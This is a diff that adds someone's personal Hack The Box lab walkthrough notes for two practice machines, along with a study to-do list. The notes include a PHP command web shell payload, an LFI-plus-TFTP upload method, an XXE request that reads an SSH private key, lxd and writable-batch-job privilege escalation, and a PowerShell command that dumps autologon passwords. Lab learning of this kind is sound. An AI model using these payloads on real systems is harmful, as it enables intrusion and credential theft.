@@ -131,7 +131,63 @@ db.admin.update(
 
 -------------------------------------------------------------------------------------
 
+# Machine: Included
 
+# Initial Access
+## UDP port enumeration, we find tftp
+## LFI found from the parameter on the page `http://10.129.78.132/?file=home.php`
+## using `python 2.7 pip module tftpy` to put file in the default tftp folder `/var/lib/tftpboot` as per documentation: (https://help.ubuntu.com/community/TFTP#:~:text=The%20default%20configuration%20file%20for,%2Fvar%2Flib%2Ftftpboot)
+## tftpy syntax:
+1. importing module using `import tftpy`
+2. establishing client connection using `client = tftpy.TftpClient("<RHOST>",69)`
+*noting that: the rhost has to be enclosed in two quotation marks like above, while the port doesn't. Also, the word TftpClient is case-sensitive*
+3. uploading files using `client.upload("<FILENAME>","/full/path/to/file", timeout=5)`
+## we get no luck in uploading the standard php reverse shell, and no luck with a standard `<?php exec($_REQUEST["cmd"]);?>` payload.
+## but `<?php passthru($_REQUEST["cmd"]);?>` works just fine
+## we then create a bash reverse shell and upload it to the victim which works
+
+# Privilege Escalation
+## we read `.htpasswd` in the webroot and find something interesting `mike:Sheffield19`
+## we use `su` to switch to that user and it works
+## we use `id` to find his group membership and find that he's a member of the `lxd` group
+## we follow standard privesc steps to create a container with the flag `security.privileged=true` so our container interacts with the host as root
+## we execute `/bin/sh` as our container and become root!
+
+-------------------------------------------------------------------------------------
+
+# Markup
+## we use default credentials `admin` and `password` to login into the web app
+## *browsing around the app,* we find a page that lets us request items
+## *browsing the source code,* we find a username *daniel*
+## finding an XXE vulnerability where the page `process.php` handles the given data as xml
+```
+POST /process.php HTTP/1.1
+Host: 10.129.67.129
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/xml
+Content-Length: 192
+Origin: http://10.129.67.129
+Connection: close
+Referer: http://10.129.67.129/services.php
+Cookie: PHPSESSID=5edhv6kgqtq8fnavg0a7gdd2om
+
+<?xml version = "1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///C:/users/daniel/.ssh/id_rsa'>]>
+<order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>
+```
+## *in the above request,* we are posting to /process.php which takes in our xml file. we create an xml entity called `test` and call it from inside the xml as `&test;`
+## we use the file read capabiltiy to get the `id_rsa` file in the home folder of the `daniel` user.
+## we know this information because the ssh port happened to be open on the machine from our port scan.
+## Scenario: if we didn't know the username, we would have bruteforced home directories using a list of common username. that's of course after taking a shot at the administrator's profile first
+## *before using the ssh key,* we change its permissions on our system `chmod 600 id_rsa`
+## `ssh -i id_rsa daniel@<RHOST>`
+## *after logging in,* we find a strange folder `Log-Management` that contained a batch script `job.bat` which seemed to do a routine task of clearing event logs
+## we find that we can write to it and we set our own command `net localgroup administrators daniel /add` to run which makes us a local admin user.
+## that takes effect after we *relogin* through SSH
+## *another way* was to enumerate autologon credentials, this can be using powershell `'DefaultDomainName', 'DefaultUserName', 'DefaultPassword', 'AltDefaultDomainName', 'AltDefaultUserName', 'AltDefaultPassword' | % {Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name $_}`
+## they contained the password for the administrator user which we can use to SSH in and gain local admin access.
 
 -------------------------------------------------------------------------------------
 
@@ -141,14 +197,25 @@ db.admin.update(
 3. configure mariadb
 4. configure nginx
 5. configure apache
-5. configure CMSs
+6. configure CMSs
 	1. wordpress
 	2. magento
 	3. drupal
 	4. joomla
-+ play around with them
++ play around with them:
+	1. find config files + check if they contain passwords
+7. configure mongodb and play with it
 
 # what i fucking hate about hack the box
 1. difficult level. what the fuck is easy????????? according to whom????? mr.robot crew?
 
 # hack the box is about making you learn the technology and what can be done to hack it
+
+# web vulns discussed
+1. LFI/RFI
+2. SQLi
+3. SSTI
+4. Cookie Tampering and authentication bypass
+5. IDOR for authorization bypass
+6. XXE
+7. Log4J
